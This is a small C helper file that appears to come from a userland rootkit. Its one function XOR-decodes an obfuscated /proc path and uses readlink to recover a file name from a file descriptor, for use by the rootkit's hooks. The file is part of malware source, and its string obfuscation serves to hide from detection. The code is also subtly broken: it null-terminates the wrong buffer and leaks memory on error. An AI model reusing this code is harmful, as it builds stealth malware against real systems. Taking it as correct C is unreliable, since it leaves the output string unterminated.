#include <string.h> 
#include <sys/stat.h>
#include <stdio.h> 
#include "../rkconst.h"

// Gets name from file description 
// Don't need one for fpointer because most of the hooks only take fdesc 
int name_from_fd(int fd, char *buf, size_t size)
{ 
	char name[256]; 
	memset(name, 0x00, sizeof(name));
	char *proc_path = strdup(PROC_PATH); xor(proc_path);	
	snprintf(name, sizeof(name), proc_path, fd);
	ssize_t ret = readlink(name, buf, size); 
		
	if (ret == -1) 
	{
		#ifdef DEBUG
		printf("[name_from_fd]: readlink() failed.\n"); 
		#endif
		return 0; 
	}
	name[ret] = '\0'; 
	CLEAN(proc_path); 
	return 1; 
}

